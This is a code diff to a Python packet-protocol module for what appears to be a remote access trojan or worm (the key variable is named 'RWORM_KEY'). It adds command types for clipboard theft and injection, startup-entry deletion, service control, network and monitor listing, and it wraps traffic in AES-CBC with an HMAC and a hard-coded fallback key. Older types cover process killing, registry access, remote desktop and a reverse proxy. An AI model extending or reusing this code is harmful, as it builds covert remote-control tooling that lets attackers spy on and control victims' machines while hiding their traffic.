@@ -1,5 +1,8 @@
-﻿import struct
+import struct
 import hashlib
+import os
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding, hmac, hashes
 
 PACKET_TYPES = {
     # Core
@@ -32,6 +35,9 @@ PACKET_TYPES = {
     'PROC_LIST_REQ':  0x50,
     'PROC_LIST_RESP': 0x51,
     'PROC_KILL':      0x52,
+    # System Metrics 0x55-0x56
+    'METRICS_REQ':    0x55,
+    'METRICS_RESP':   0x56,
     # Registry 0x60-0x6F
     'REG_LIST_REQ':  0x60,
     'REG_LIST_RESP': 0x61,
@@ -47,6 +53,26 @@ PACKET_TYPES = {
     'RD_FRAME':  0x81,
     'RD_INPUT':  0x82,
     'RD_STOP':   0x83,
+    'RD_MONITORS_REQ':  0x84,
+    'RD_MONITORS_RESP': 0x85,
+    # Service Manager 0xC0-0xC3
+    'SERVICES_LIST_REQ':  0xC0,
+    'SERVICES_LIST_RESP': 0xC1,
+    'SERVICE_CTRL_REQ':   0xC2,
+    'SERVICE_CTRL_RESP':  0xC3,
+    # Net Monitor 0xC4-0xC5
+    'NET_LIST_REQ':       0xC4,
+    'NET_LIST_RESP':      0xC5,
+    # Autorun / Startup 0xC6-0xC9
+    'STARTUP_LIST_REQ':   0xC6,
+    'STARTUP_LIST_RESP':  0xC7,
+    'STARTUP_DEL_REQ':    0xC8,
+    'STARTUP_DEL_RESP':   0xC9,
+    # Clipboard 0xCA-0xCD
+    'CLIPBOARD_GET_REQ':  0xCA,
+    'CLIPBOARD_GET_RESP': 0xCB,
+    'CLIPBOARD_SET_REQ':  0xCC,
+    'CLIPBOARD_SET_RESP': 0xCD,
     # Reverse Proxy 0x90-0x9F
     'PROXY_START': 0x90,
     'PROXY_DATA':  0x91,
@@ -67,6 +93,47 @@ PACKET_TYPES = {
     'ERROR': 0xFF,
 }
 
+DEFAULT_KEY_STR = os.environ.get("RWORM_KEY", "AES-256-DEFAULT")
+CURRENT_KEY = hashlib.sha256(DEFAULT_KEY_STR.encode('utf-8')).digest()
+
+def set_encryption_key(key_str: str):
+    global CURRENT_KEY
+    CURRENT_KEY = hashlib.sha256(key_str.encode('utf-8')).digest()
+
+def aes_encrypt(data: bytes, key: bytes = None) -> bytes:
+    if key is None:
+        key = CURRENT_KEY
+    iv = os.urandom(16)
+    padder = padding.PKCS7(128).padder()
+    padded_data = padder.update(data) + padder.finalize()
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+    encryptor = cipher.encryptor()
+    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
+    return iv + ciphertext
+
+def aes_decrypt(data: bytes, key: bytes = None) -> bytes:
+    if key is None:
+        key = CURRENT_KEY
+    if len(data) < 16:
+        return None
+    iv = data[:16]
+    ciphertext = data[16:]
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+    decryptor = cipher.decryptor()
+    try:
+        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
+        unpadder = padding.PKCS7(128).unpadder()
+        return unpadder.update(padded_data) + unpadder.finalize()
+    except Exception:
+        return None
+
+def compute_hmac(data: bytes, key: bytes = None) -> bytes:
+    if key is None:
+        key = CURRENT_KEY
+    h = hmac.HMAC(key, hashes.SHA256())
+    h.update(data)
+    return h.finalize()[:16]
+
 class Packet:
     def __init__(self, packet_type: int, payload: bytes, session_id: int = 0):
         self.type       = packet_type
@@ -74,10 +141,11 @@ class Packet:
         self.session_id = session_id
 
     def serialize(self) -> bytes:
-        payload_len = len(self.payload)
-        header      = struct.pack('<IBI', payload_len, self.type, self.session_id)
-        hmac        = hashlib.sha256(header + self.payload).digest()[:16]
-        return header + self.payload + hmac
+        encrypted_payload = aes_encrypt(self.payload)
+        payload_len = len(encrypted_payload)
+        header = struct.pack('<IBI', payload_len, self.type, self.session_id)
+        mac = compute_hmac(header + encrypted_payload)
+        return header + encrypted_payload + mac
 
     @staticmethod
     def deserialize(data: bytes):
@@ -87,19 +155,20 @@ class Packet:
         payload_len, packet_type, session_id = struct.unpack('<IBI', header)
         if len(data) < 9 + payload_len + 16:
             return None
-        payload      = data[9:9 + payload_len]
-        rcv_hmac     = data[9 + payload_len:9 + payload_len + 16]
-        computed_hmac = hashlib.sha256(header + payload).digest()[:16]
-        if rcv_hmac != computed_hmac:
+        encrypted_payload = data[9:9 + payload_len]
+        rcv_mac           = data[9 + payload_len:9 + payload_len + 16]
+        expected_mac      = compute_hmac(header + encrypted_payload)
+        if rcv_mac != expected_mac:
             return None
-        return Packet(packet_type, payload, session_id)
-
+        plain_payload = aes_decrypt(encrypted_payload)
+        if plain_payload is None:
+            return None
+        return Packet(packet_type, plain_payload, session_id)
 
 def create_packet(packet_type, payload: bytes, session_id: int = 0) -> bytes:
     if isinstance(packet_type, str):
         packet_type = PACKET_TYPES[packet_type]
     return Packet(packet_type, payload, session_id).serialize()
-
 
 def parse_packet(data: bytes):
     return Packet.deserialize(data)
